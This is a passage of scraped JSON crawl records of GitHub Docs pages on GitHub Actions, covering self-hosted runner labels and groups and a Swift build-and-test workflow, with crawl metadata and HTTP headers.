uses: azure/webapps-deploy@85270a1854658d167ab239bce43949edb336fa7c\n        with:\n          app-name: ${{ env.AZURE_WEBAPP_NAME }}\n          publish-profile: ${{ secrets.AZURE_WEBAPP_PUBLISH_PROFILE }}\n```\n\n## [Additional resources](#additional-resources)\n\nThe following resources may also be useful:\n\n*   For the original workflow template, see [`azure-webapps-python.yml`](https://github.com/actions/starter-workflows/blob/main/deployments/azure-webapps-python.yml) in the GitHub Actions `starter-workflows` repository.\n*   The action used to deploy the web app is the official Azure [`Azure/webapps-deploy`](https://github.com/Azure/webapps-deploy) action.\n*   For more examples of GitHub Action workflows that deploy to Azure, see the [actions-workflow-samples](https://github.com/Azure/actions-workflow-samples) repository.",
  "debug": {
    "pageType": "Article",
    "pageTypeReason": "HasUrlDashes",
    "totalLinks": 247,
    "response": {
      "statusCode": 200
    },
    "snapshots": {
      "originalHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-use-cases-and-examples-deploying-deploying-python-to-azure-app-service-originalHtmlUrl",
      "removedElementsHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-use-cases-and-examples-deploying-deploying-python-to-azure-app-service-removedElementsHtmlUrl",
      "extractusHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-use-cases-and-examples-deploying-deploying-python-to-azure-app-service-extractusHtmlUrl",
      "readableTextHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-use-cases-and-examples-deploying-deploying-python-to-azure-app-service-readableTextHtmlUrl",
      "readableTextIfPossibleHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-use-cases-and-examples-deploying-deploying-python-to-azure-app-service-readableTextIfPossibleHtmlUrl"
    },
    "lengths": {
      "extractus": 10909,
      "readableText": 10575,
      "none": 36928,
      "readableTextIfPossible": 36928,
      "result": 10575,
      "markdown": 7631
    },
    "requestHandlerMode": "browser"
  }
},
{
  "url": "https://docs.github.com/en/actions/hosting-your-own-runners/managing-self-hosted-runners/using-self-hosted-runners-in-a-workflow",
  "crawl": {
    "loadedUrl": "https://docs.github.com/en/actions/hosting-your-own-runners/managing-self-hosted-runners/using-self-hosted-runners-in-a-workflow",
    "loadedTime": "2025-05-08T06:42:32.218Z",
    "referrerUrl": "https://docs.github.com/en/actions",
    "depth": 1,
    "httpStatusCode": 200
  },
  "metadata": {
    "canonicalUrl": "https://docs.github.com/en/actions/hosting-your-own-runners/managing-self-hosted-runners/using-self-hosted-runners-in-a-workflow",
    "title": "Using self-hosted runners in a workflow - GitHub Docs",
    "description": "To use self-hosted runners in a workflow, you can use labels or groups to specify the runner for a job.",
    "author": null,
    "keywords": null,
    "languageCode": "en",
    "openGraph": [
      {
        "property": "og:site_name",
        "content": "GitHub Docs"
      },
      {
        "property": "og:title",
        "content": "Using self-hosted runners in a workflow - GitHub Docs"
      },
      {
        "property": "og:type",
        "content": "article"
      },
      {
        "property": "og:url",
        "content": "https://docs-internal.github.com/en/actions/hosting-your-own-runners/managing-self-hosted-runners/using-self-hosted-runners-in-a-workflow"
      },
      {
        "property": "og:image",
        "content": "https://docs.github.com/assets/cb-345/images/social-cards/actions.png"
      },
      {
        "property": "twitter:domain",
        "content": "docs-internal.github.com"
      },
      {
        "property": "twitter:url",
        "content": "https://docs-internal.github.com/en/actions/hosting-your-own-runners/managing-self-hosted-runners/using-self-hosted-runners-in-a-workflow"
      }
    ],
    "jsonLd": null,
    "headers": {
      "access-control-allow-origin": "*",
      "content-security-policy": "default-src 'none';prefetch-src 'self';connect-src 'self';font-src 'self' data:;img-src 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com data: placehold.it;object-src 'self';script-src 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com 'self' data:;script-src-attr 'self';frame-src 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com https://support.github.com https://www.youtube-nocookie.com;frame-ancestors 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com;style-src 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com 'self' 'unsafe-inline' data:;child-src 'self';manifest-src 'self';upgrade-insecure-requests;base-uri 'self';form-action 'self'",
      "cross-origin-opener-policy": "same-origin",
      "cross-origin-resource-policy": "same-origin",
      "origin-agent-cluster": "?1",
      "referrer-policy": "no-referrer-when-downgrade",
      "x-content-type-options": "nosniff",
      "x-dns-prefetch-control": "off",
      "x-download-options": "noopen",
      "x-frame-options": "SAMEORIGIN",
      "x-permitted-cross-domain-policies": "none",
      "x-xss-protection": "0",
      "cache-control": "public, max-age=60",
      "x-powered-by": "Next.js",
      "content-type": "text/html; charset=utf-8",
      "x-github-backend": "Kubernetes",
      "x-github-request-id": "8CF1:1F7030:BAD713:F536CE:681C524F",
      "content-encoding": "br",
      "accept-ranges": "bytes",
      "age": "0",
      "date": "Thu, 08 May 2025 06:42:24 GMT",
      "via": "1.1 varnish",
      "x-served-by": "cache-nyc-kteb1890061-NYC",
      "x-cache": "MISS",
      "x-cache-hits": "0",
      "x-timer": "S1746686544.943642, VS0, VE294",
      "vary": "Accept-Encoding",
      "strict-transport-security": "max-age=31557600",
      "content-length": "28747",
      "x-firefox-spdy": "h2"
    }
  },
  "screenshotUrl": null,
  "text": "Using self-hosted runners in a workflow\nTo use self-hosted runners in a workflow, you can use labels or groups to specify the runner for a job.\nYou can target self-hosted runners for use in a workflow based on the labels assigned to the runners, or their group membership, or a combination of these.\nAbout self-hosted runner labels\nLabels allow you to send workflow jobs to specific types of self-hosted runners, based on their shared characteristics. For example, if your job requires a particular hardware component or software package, you can assign a custom label to a runner and then configure your job to only execute on runners with that label.\nTo specify a self-hosted runner for your job, configure runs-on in your workflow file with self-hosted runner labels.\nSelf-hosted runners may have the self-hosted label. When setting up a self-hosted runner, by default we will include the label self-hosted. You may pass in the --no-default-labels flag to prevent the self-hosted label from being applied. Labels can be used to create targeting options for runners, such as operating system or architecture, we recommend providing an array of labels that begins with self-hosted (this must be listed first) and then includes additional labels as needed. When you specify an array of labels, jobs will be queued on runners that have all the labels that you specify.\nNote that Actions Runner Controller does not support multiple labels and does not support the self-hosted label.\nFor information on creating custom and default labels, see Using labels with self-hosted runners.\nAbout self-hosted runner groups\nFor self-hosted runners defined at the organization level, you can group your runners with shared characteristics into a single runner group and then configure your job to target the runner group.\nTo specify a self-hosted runner group for your job, configure runs-on.group in your workflow file.\nFor information on creating and managing runner groups, see Managing access to self-hosted runners using groups.\nViewing available runners for a repository\nIf you have repo: write access to a repository, you can view a list of the runners available to the repository.\nOn GitHub, navigate to the main page of the repository.\nUnder your repository name, click Actions.\nIn the left sidebar, under the \"Management\" section, click Runners.\nClick the Self hosted tab at the top of the list of runners.\nReview the list of available self-hosted runners for the repository. This list includes both self-hosted runners and runner scale sets created with Actions Runner Controller. For more information, see About Actions Runner Controller.\nOptionally, to copy a runner's label to use it in a workflow, click to the right of the runner, then click Copy label.\nNote\nEnterprise and organization owners can create runners from this page. To create a new runner, click New runner at the top right of the list of runners to add runners to the repository.\nFor more information, see Managing larger runners and Adding self-hosted runners.\nUsing default labels to route jobs\nA self-hosted runner automatically receives certain labels when it is added to GitHub Actions. These are used to indicate its operating system and hardware platform:\nself-hosted: Default label applied to self-hosted runners.\nlinux, windows, or macOS: Applied depending on operating system.\nx64, ARM, or ARM64: Applied depending on hardware architecture.\nYou can use your workflow's YAML to send jobs to a combination of these labels. In this example, a self-hosted runner that matches all three labels will be eligible to run the job:\nruns-on: [self-hosted, linux, ARM64] \nself-hosted - Run this job on a self-hosted runner.\nlinux - Only use a Linux-based runner.\nARM64 - Only use a runner based on ARM64 hardware.\nTo create individual self-hosted runners without the default labels, pass the --no-default-labels flag when you create the runner. Actions Runner Controller does not support multiple labels.\nUsing custom labels to route jobs\nYou can create custom labels and assign them to your self-hosted runners at any time. Custom labels let you send jobs to particular types of self-hosted runners, based on how they're labeled.\nFor example, if you have a job that requires a specific type of graphics hardware, you can create a custom label called gpu and assign it to the runners that have the hardware installed. A self-hosted runner that matches all the assigned labels will then be eligible to run the job.\nThis example shows a job that combines default and custom labels:\nruns-on: [self-hosted, linux, x64, gpu] \nself-hosted - Run this job on a self-hosted runner.\nlinux - Only use a Linux-based runner.\nx64 - Only use a runner based on x64 hardware.\ngpu - This custom label has been manually assigned to self-hosted runners with the GPU hardware installed.\nThese labels operate cumulatively, so a self-hosted runner must have all four labels to be eligible to process the job.\nUsing groups to route jobs\nIn this example, Ubuntu runners have been added to a group called ubuntu-runners. The runs-on key sends the job to any available runner in the ubuntu-runners group:\nname: learn-github-actions on: [push] jobs: check-bats-version: runs-on: group: ubuntu-runners steps: - uses: actions/checkout@v4 - uses: actions/setup-node@v4 with: node-version: '14' - run: npm install -g bats - run: bats -v \nUsing labels and groups to route jobs\nWhen you combine groups and labels, the runner must meet both requirements to be eligible to run the job.\nIn this example, a runner group called ubuntu-runners is populated with Ubuntu runners, which have also been assigned the label ubuntu-20.04-16core. The runs-on key combines group and labels so that the job is routed to any available runner within the group that also has a matching label:\nname: learn-github-actions on: [push] jobs: check-bats-version: runs-on: group: ubuntu-runners labels: ubuntu-20.04-16core steps: - uses: actions/checkout@v4 - uses: actions/setup-node@v4 with: node-version: '14' - run: npm install -g bats - run: bats -v \nRouting precedence for self-hosted runners\nWhen routing a job to a self-hosted runner, GitHub looks for a runner that matches the job's runs-on labels and groups:\nIf GitHub finds an online and idle runner that matches the job's runs-on labels and groups, the job is then assigned and sent to the runner. \nIf the runner doesn't pick up the assigned job within 60 seconds, the job is re-queued so that a new runner can accept it.\nIf GitHub doesn't find an online and idle runner that matches the job's runs-on labels and groups, then the job will remain queued until a runner comes online.\nIf the job remains queued for more than 24 hours, the job will fail.\nWorkflow run continuity\nIf GitHub Actions services are temporarily unavailable, then a workflow run is discarded if it has not been queued within 30 minutes of being triggered. For example, if a workflow is triggered and the GitHub Actions services are unavailable for 31 minutes or longer, then the workflow run will not be processed.",
  "htmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-hosting-your-own-runners-managing-self-hosted-runners-using-self-hosted-runners-in-a-workflow-gemjn.html",
  "markdown": "# Using self-hosted runners in a workflow\n\nTo use self-hosted runners in a workflow, you can use labels or groups to specify the runner for a job.\n\nYou can target self-hosted runners for use in a workflow based on the labels assigned to the runners, or their group membership, or a combination of these.\n\n## [About self-hosted runner labels](#about-self-hosted-runner-labels)\n\nLabels allow you to send workflow jobs to specific types of self-hosted runners, based on their shared characteristics. For example, if your job requires a particular hardware component or software package, you can assign a custom label to a runner and then configure your job to only execute on runners with that label.\n\nTo specify a self-hosted runner for your job, configure `runs-on` in your workflow file with self-hosted runner labels.\n\nSelf-hosted runners may have the `self-hosted` label. When setting up a self-hosted runner, by default we will include the label `self-hosted`. You may pass in the `--no-default-labels` flag to prevent the self-hosted label from being applied. Labels can be used to create targeting options for runners, such as operating system or architecture, we recommend providing an array of labels that begins with `self-hosted` (this must be listed first) and then includes additional labels as needed. When you specify an array of labels, jobs will be queued on runners that have all the labels that you specify.\n\nNote that Actions Runner Controller does not support multiple labels and does not support the `self-hosted` label.\n\nFor information on creating custom and default labels, see [Using labels with self-hosted runners](https://docs.github.com/en/actions/hosting-your-own-runners/managing-self-hosted-runners/using-labels-with-self-hosted-runners).\n\n## [About self-hosted runner groups](#about-self-hosted-runner-groups)\n\nFor self-hosted runners defined at the organization level, you can group your runners with shared characteristics into a single runner group and then configure your job to target the runner group.\n\nTo specify a self-hosted runner group for your job, configure `runs-on.group` in your workflow file.\n\nFor information on creating and managing runner groups, see [Managing access to self-hosted runners using groups](https://docs.github.com/en/actions/hosting-your-own-runners/managing-self-hosted-runners/managing-access-to-self-hosted-runners-using-groups).\n\n## [Viewing available runners for a repository](#viewing-available-runners-for-a-repository)\n\nIf you have `repo: write` access to a repository, you can view a list of the runners available to the repository.\n\n1.  On GitHub, navigate to the main page of the repository.\n    \n2.  Under your repository name, click **Actions**.\n    \n    ![Screenshot of the tabs for the \"github/docs\" repository. The \"Actions\" tab is highlighted with an orange outline.](https://docs.github.com/assets/cb-12958/images/help/repository/actions-tab-global-nav-update.png)\n    \n3.  In the left sidebar, under the \"Management\" section, click **Runners**.\n    \n4.  Click the **Self hosted** tab at the top of the list of runners.\n    \n5.  Review the list of available self-hosted runners for the repository. This list includes both self-hosted runners and runner scale sets created with Actions Runner Controller. For more information, see [About Actions Runner Controller](https://docs.github.com/en/actions/hosting-your-own-runners/managing-self-hosted-runners-with-actions-runner-controller/about-actions-runner-controller).\n    \n6.  Optionally, to copy a runner's label to use it in a workflow, click to the right of the runner, then click **Copy label**.\n    \n\nNote\n\nEnterprise and organization owners can create runners from this page. To create a new runner, click **New runner** at the top right of the list of runners to add runners to the repository.\n\nFor more information, see [Managing larger runners](https://docs.github.com/en/actions/using-github-hosted-runners/managing-larger-runners) and [Adding self-hosted runners](https://docs.github.com/en/actions/hosting-your-own-runners/managing-self-hosted-runners/adding-self-hosted-runners).\n\n## [Using default labels to route jobs](#using-default-labels-to-route-jobs)\n\nA self-hosted runner automatically receives certain labels when it is added to GitHub Actions. These are used to indicate its operating system and hardware platform:\n\n*   `self-hosted`: Default label applied to self-hosted runners.\n*   `linux`, `windows`, or `macOS`: Applied depending on operating system.\n*   `x64`, `ARM`, or `ARM64`: Applied depending on hardware architecture.\n\nYou can use your workflow's YAML to send jobs to a combination of these labels. In this example, a self-hosted runner that matches all three labels will be eligible to run the job:\n\n```\nruns-on: [self-hosted, linux, ARM64]\n```\n\n*   `self-hosted` - Run this job on a self-hosted runner.\n*   `linux` - Only use a Linux-based runner.\n*   `ARM64` - Only use a runner based on ARM64 hardware.\n\nTo create individual self-hosted runners without the default labels, pass the `--no-default-labels` flag when you create the runner. Actions Runner Controller does not support multiple labels.\n\n## [Using custom labels to route jobs](#using-custom-labels-to-route-jobs)\n\nYou can create custom labels and assign them to your self-hosted runners at any time. Custom labels let you send jobs to particular types of self-hosted runners, based on how they're labeled.\n\nFor example, if you have a job that requires a specific type of graphics hardware, you can create a custom label called `gpu` and assign it to the runners that have the hardware installed. A self-hosted runner that matches all the assigned labels will then be eligible to run the job.\n\nThis example shows a job that combines default and custom labels:\n\n```\nruns-on: [self-hosted, linux, x64, gpu]\n```\n\n*   `self-hosted` - Run this job on a self-hosted runner.\n*   `linux` - Only use a Linux-based runner.\n*   `x64` - Only use a runner based on x64 hardware.\n*   `gpu` - This custom label has been manually assigned to self-hosted runners with the GPU hardware installed.\n\nThese labels operate cumulatively, so a self-hosted runner must have all four labels to be eligible to process the job.\n\n## [Using groups to route jobs](#using-groups-to-route-jobs)\n\nIn this example, Ubuntu runners have been added to a group called `ubuntu-runners`. The `runs-on` key sends the job to any available runner in the `ubuntu-runners` group:\n\n```\nname: learn-github-actions\non: [push]\njobs:\n  check-bats-version:\n    runs-on: \n      group: ubuntu-runners\n    steps:\n      - uses: actions/checkout@v4\n      - uses: actions/setup-node@v4\n        with:\n          node-version: '14'\n      - run: npm install -g bats\n      - run: bats -v\n```\n\n## [Using labels and groups to route jobs](#using-labels-and-groups-to-route-jobs)\n\nWhen you combine groups and labels, the runner must meet both requirements to be eligible to run the job.\n\nIn this example, a runner group called `ubuntu-runners` is populated with Ubuntu runners, which have also been assigned the label `ubuntu-20.04-16core`. The `runs-on` key combines `group` and `labels` so that the job is routed to any available runner within the group that also has a matching label:\n\n```\nname: learn-github-actions\non: [push]\njobs:\n  check-bats-version:\n    runs-on:\n      group: ubuntu-runners\n      labels: ubuntu-20.04-16core\n    steps:\n      - uses: actions/checkout@v4\n      - uses: actions/setup-node@v4\n        with:\n          node-version: '14'\n      - run: npm install -g bats\n      - run: bats -v\n```\n\n## [Routing precedence for self-hosted runners](#routing-precedence-for-self-hosted-runners)\n\nWhen routing a job to a self-hosted runner, GitHub looks for a runner that matches the job's `runs-on` labels and groups:\n\n*   If GitHub finds an online and idle runner that matches the job's `runs-on` labels and groups, the job is then assigned and sent to the runner.\n    *   If the runner doesn't pick up the assigned job within 60 seconds, the job is re-queued so that a new runner can accept it.\n*   If GitHub doesn't find an online and idle runner that matches the job's `runs-on` labels and groups, then the job will remain queued until a runner comes online.\n*   If the job remains queued for more than 24 hours, the job will fail.\n\n## [Workflow run continuity](#workflow-run-continuity)\n\nIf GitHub Actions services are temporarily unavailable, then a workflow run is discarded if it has not been queued within 30 minutes of being triggered. For example, if a workflow is triggered and the GitHub Actions services are unavailable for 31 minutes or longer, then the workflow run will not be processed.",
  "debug": {
    "pageType": "Article",
    "pageTypeReason": "HasUrlDashes",
    "totalLinks": 251,
    "response": {
      "statusCode": 200
    },
    "snapshots": {
      "originalHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-hosting-your-own-runners-managing-self-hosted-runners-using-self-hosted-runners-in-a-workflow-originalHtmlUrl",
      "removedElementsHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-hosting-your-own-runners-managing-self-hosted-runners-using-self-hosted-runners-in-a-workflow-removedElementsHtmlUr",
      "extractusHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-hosting-your-own-runners-managing-self-hosted-runners-using-self-hosted-runners-in-a-workflow-extractusHtmlUrl",
      "readableTextHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-hosting-your-own-runners-managing-self-hosted-runners-using-self-hosted-runners-in-a-workflow-readableTextHtmlUrl",
      "readableTextIfPossibleHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-hosting-your-own-runners-managing-self-hosted-runners-using-self-hosted-runners-in-a-workflow-readableTextIfPossibl"
    },
    "lengths": {
      "extractus": 12567,
      "readableText": 11532,
      "none": 34196,
      "readableTextIfPossible": 11532,
      "result": 11532,
      "markdown": 8685
    },
    "requestHandlerMode": "browser"
  }
},
{
  "url": "https://docs.github.com/en/actions/use-cases-and-examples/building-and-testing/building-and-testing-swift",
  "crawl": {
    "loadedUrl": "https://docs.github.com/en/actions/use-cases-and-examples/building-and-testing/building-and-testing-swift",
    "loadedTime": "2025-05-08T06:42:32.523Z",
    "referrerUrl": "https://docs.github.com/en/actions",
    "depth": 1,
    "httpStatusCode": 200
  },
  "metadata": {
    "canonicalUrl": "https://docs.github.com/en/actions/use-cases-and-examples/building-and-testing/building-and-testing-swift",
    "title": "Building and testing Swift - GitHub Docs",
    "description": "You can create a continuous integration (CI) workflow to build and test your Swift project.",
    "author": null,
    "keywords": "CI,Swift",
    "languageCode": "en",
    "openGraph": [
      {
        "property": "og:site_name",
        "content": "GitHub Docs"
      },
      {
        "property": "og:title",
        "content": "Building and testing Swift - GitHub Docs"
      },
      {
        "property": "og:type",
        "content": "article"
      },
      {
        "property": "og:url",
        "content": "https://docs-internal.github.com/en/actions/use-cases-and-examples/building-and-testing/building-and-testing-swift"
      },
      {
        "property": "og:image",
        "content": "https://docs.github.com/assets/cb-345/images/social-cards/actions.png"
      },
      {
        "property": "twitter:domain",
        "content": "docs-internal.github.com"
      },
      {
        "property": "twitter:url",
        "content": "https://docs-internal.github.com/en/actions/use-cases-and-examples/building-and-testing/building-and-testing-swift"
      }
    ],
    "jsonLd": null,
    "headers": {
      "access-control-allow-origin": "*",
      "content-security-policy": "default-src 'none';prefetch-src 'self';connect-src 'self';font-src 'self' data:;img-src 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com data: placehold.it;object-src 'self';script-src 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com 'self' data:;script-src-attr 'self';frame-src 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com https://support.github.com https://www.youtube-nocookie.com;frame-ancestors 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com;style-src 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com 'self' 'unsafe-inline' data:;child-src 'self';manifest-src 'self';upgrade-insecure-requests;base-uri 'self';form-action 'self'",
      "cross-origin-opener-policy": "same-origin",
      "cross-origin-resource-policy": "same-origin",
      "origin-agent-cluster": "?1",
      "referrer-policy": "no-referrer-when-downgrade",
      "x-content-type-options": "nosniff",
      "x-dns-prefetch-control": "off",
      "x-download-options": "noopen",
      "x-frame-options": "SAMEORIGIN",
      "x-permitted-cross-domain-policies": "none",
      "x-xss-protection": "0",
      "cache-control": "public, max-age=60",
      "x-powered-by": "Next.js",
      "content-type": "text/html; charset=utf-8",
      "x-github-backend": "Kubernetes",
      "x-github-request-id": "59E1:1ED828:428F19:54B1A7:681C5251",
      "content-encoding": "br",
      "accept-ranges": "bytes",
      "age": "0",
      "date": "Thu, 08 May 2025 06:42:26 GMT",
      "via": "1.1 varnish",
      "x-served-by": "cache-nyc-kteb1890061-NYC",
      "x-cache": "MISS",
      "x-cache-hits": "0",
      "x-timer": "S1746686546.538739, VS0, VE1263",
      "vary": "Accept-Encoding",
      "strict-transport-security": "max-age=31557600",
      "content-length": "27759",
      "x-firefox-spdy": "h2"
    }
  },
  "screenshotUrl": null,
  "text": "Building and testing Swift - GitHub Docs\nYou can create a continuous integration (CI) workflow to build and test your Swift project.\nIntroduction\nThis guide shows you how to build and test a Swift package.\nGitHub-hosted runners have a tools cache with preinstalled software, and the Ubuntu and macOS runners include the dependencies for building Swift packages. For a full list of up-to-date software and the preinstalled versions of Swift and Xcode, see Using GitHub-hosted runners.\nPrerequisites\nYou should already be familiar with YAML syntax and how it's used with GitHub Actions. For more information, see Workflow syntax for GitHub Actions.\nWe recommend that you have a basic understanding of Swift packages. For more information, see Swift Packages in the Apple developer documentation.\nUsing a Swift workflow template\nTo get started quickly, add a workflow template to the .github/workflows directory of your repository.\nGitHub provides a workflow template for Swift that should work for most Swift projects. The subsequent sections of this guide give examples of how you can customize this workflow template.\nOn GitHub, navigate to the main page of the repository.\nUnder your repository name, click Actions.\nIf you already have a workflow in your repository, click New workflow.\nThe \"Choose a workflow\" page shows a selection of recommended workflow templates. Search for \"swift\".\nFilter the selection of workflows by clicking Continuous integration.\nOn the \"Swift\" workflow, click Configure.\nEdit the workflow as required. For example, change the branch on which the workflow will run.\nClick Commit changes.\nThe swift.yml workflow file is added to the .github/workflows directory of your repository.\nSpecifying a Swift version\nTo use a specific preinstalled version of Swift on a GitHub-hosted runner, use the swift-actions/setup-swift action. This action finds a specific version of Swift from the tools cache on the runner and adds the necessary binaries to PATH. These changes will persist for the remainder of a job. For more information, see the swift-actions/setup-swift action.\nIf you are using a self-hosted runner, you must install your desired Swift versions and add them to PATH.\nThe examples below demonstrate using the swift-actions/setup-swift action.\nUsing multiple Swift versions\nYou can configure your job to use multiple versions of Swift in a matrix.\nYAML\n# This workflow uses actions that are not certified by GitHub. # They are provided by a third-party and are governed by # separate terms of service, privacy policy, and support # documentation. # GitHub recommends pinning actions to a commit SHA. # To get a newer version, you will need to update the SHA. # You can also reference a tag or branch, but the action may change without warning. name: Swift on: [push] jobs: build: name: Swift ${{ matrix.swift }} on ${{ matrix.os }} strategy: matrix: os: [ubuntu-latest, macos-latest] swift: [\"5.2\", \"5.3\"] runs-on: ${{ matrix.os }} steps: - uses: swift-actions/setup-swift@65540b95f51493d65f5e59e97dcef9629ddf11bf with: swift-version: ${{ matrix.swift }} - uses: actions/checkout@v4 - name: Build run: swift build - name: Run tests run: swift test \nUsing a single specific Swift version\nYou can configure your job to use a single specific version of Swift, such as 5.3.3.\nYAML\nsteps: - uses: swift-actions/setup-swift@65540b95f51493d65f5e59e97dcef9629ddf11bf with: swift-version: \"5.3.3\" - name: Get swift version run: swift --version # Swift 5.3.3 \nBuilding and testing your code\nYou can use the same commands that you use locally to build and test your code using Swift. This example demonstrates how to use swift build and swift test in a job:\nYAML\nsteps: - uses: actions/checkout@v4 - uses: swift-actions/setup-swift@65540b95f51493d65f5e59e97dcef9629ddf11bf with: swift-version: \"5.3.3\" - name: Build run: swift build - name: Run tests run: swift test",
  "htmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-use-cases-and-examples-building-and-testing-building-and-testing-swift-uie4d.html",
  "markdown": "# Building and testing Swift - GitHub Docs\n\nYou can create a continuous integration (CI) workflow to build and test your Swift project.\n\n## [Introduction](#introduction)\n\nThis guide shows you how to build and test a Swift package.\n\nGitHub-hosted runners have a tools cache with preinstalled software, and the Ubuntu and macOS runners include the dependencies for building Swift packages. For a full list of up-to-date software and the preinstalled versions of Swift and Xcode, see [Using GitHub-hosted runners](https://docs.github.com/en/actions/using-github-hosted-runners/about-github-hosted-runners#supported-software).\n\n## [Prerequisites](#prerequisites)\n\nYou should already be familiar with YAML syntax and how it's used with GitHub Actions. For more information, see [Workflow syntax for GitHub Actions](https://docs.github.com/en/actions/using-workflows/workflow-syntax-for-github-actions).\n\nWe recommend that you have a basic understanding of Swift packages. For more information, see [Swift Packages](https://developer.apple.com/documentation/xcode/swift-packages) in the Apple developer documentation.\n\n## [Using a Swift workflow template](#using-a-swift-workflow-template)\n\nTo get started quickly, add a workflow template to the `.github/workflows` directory of your repository.\n\nGitHub provides a workflow template for Swift that should work for most Swift projects. The subsequent sections of this guide give examples of how you can customize this workflow template.\n\n1.  On GitHub, navigate to the main page of the repository.\n    \n2.  Under your repository name, click **Actions**.\n    \n    ![Screenshot of the tabs for the \"github/docs\" repository. The \"Actions\" tab is highlighted with an orange outline.](https://docs.github.com/assets/cb-12958/images/help/repository/actions-tab-global-nav-update.png)\n    \n3.  If you already have a workflow in your repository, click **New workflow**.\n    \n4.  The \"Choose a workflow\" page shows a selection of recommended workflow templates. Search for \"swift\".\n    \n5.  Filter the selection of workflows by clicking **Continuous integration**.\n    \n6.  On the \"Swift\" workflow, click **Configure**.\n    \n7.  Edit the workflow as required. For example, change the branch on which the workflow will run.\n    \n8.  Click **Commit changes**.\n    \n    The `swift.yml` workflow file is added to the `.github/workflows` directory of your repository.\n    \n\n## [Specifying a Swift version](#specifying-a-swift-version)\n\nTo use a specific preinstalled version of Swift on a GitHub-hosted runner, use the `swift-actions/setup-swift` action. This action finds a specific version of Swift from the tools cache on the runner and adds the necessary binaries to `PATH`. These changes will persist for the remainder of a job. For more information, see the [`swift-actions/setup-swift`](https://github.com/marketplace/actions/setup-swift) action.\n\nIf you are using a self-hosted runner, you must install your desired Swift versions and add them to `PATH`.\n\nThe examples below demonstrate using the `swift-actions/setup-swift` action.\n\n### [Using multiple Swift versions](#using-multiple-swift-versions)\n\nYou can configure your job to use multiple versions of Swift in a matrix.\n\nYAML\n\n```\n\n# This workflow uses actions that are not certified by GitHub.\n# They are provided by a third-party and are governed by\n# separate terms of service, privacy policy, and support\n# documentation.\n\n# GitHub recommends pinning actions to a commit SHA.\n# To get a newer version, you will need to update the SHA.\n# You can also reference a tag or branch, but the action may change without warning.\n\nname: Swift\n\non: [push]\n\njobs:\n  build:\n    name: Swift ${{ matrix.swift }} on ${{ matrix.os }}\n    strategy:\n      matrix:\n        os: [ubuntu-latest, macos-latest]\n        swift: [\"5.2\", \"5.3\"]\n    runs-on: ${{ matrix.os }}\n    steps:\n      - uses: swift-actions/setup-swift@65540b95f51493d65f5e59e97dcef9629ddf11bf\n        with:\n          swift-version: ${{ matrix.swift }}\n      - uses: actions/checkout@v4\n      - name: Build\n        run: swift build\n      - name: Run tests\n        run: swift test\n```\n\n### [Using a single specific Swift version](#using-a-single-specific-swift-version)\n\nYou can configure your job to use a single specific version of Swift, such as `5.3.3`.\n\nYAML\n\n```\nsteps:\n  - uses: swift-actions/setup-swift@65540b95f51493d65f5e59e97dcef9629ddf11bf\n    with:\n      swift-version: \"5.3.3\"\n  - name: Get swift version\n    run: swift --version # Swift 5.3.3\n```\n\n## [Building and testing your code](#building-and-testing-your-code)\n\nYou can use the same commands that you use locally to build and test your code using Swift. This example demonstrates how to use `swift build` and `swift test` in a job:\n\nYAML\n\n```\nsteps:\n  - uses: actions/checkout@v4\n  - uses: swift-actions/setup-swift@65540b95f51493d65f5e59e97dcef9629ddf11bf\n    with:\n      swift-version: \"5.3.3\"\n  - name: Build\n    run: swift build\n  - name: Run tests\n    run: swift test\n```",
  "debug": {
    "pageType": "Article",
    "pageTypeReason": "HasUrlDashes",
    "totalLinks": 243,
    "response": {
      "statusCode": 200
    },
    "snapshots": {
      "originalHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-use-cases-and-examples-building-and-testing-building-and-testing-swift-originalHtmlUrl",
      "removedElementsHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-use-cases-and-examples-building-and-testing-building-and-testing-swift-removedElementsHtmlUrl",
      "extractusHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-use-cases-and-examples-building-and-testing-building-and-testing-swift-extractusHtmlUrl",
      "readableTextHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-use-cases-and-examples-building-and-testing-building-and-testing-swift-readableTextHtmlUrl",
      "readableTextIfPossibleHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-use-cases-and-examples-building-and-testing-building-and-testing-swift-readableTextIfPossibleHtmlUrl"
    },
    "lengths": {
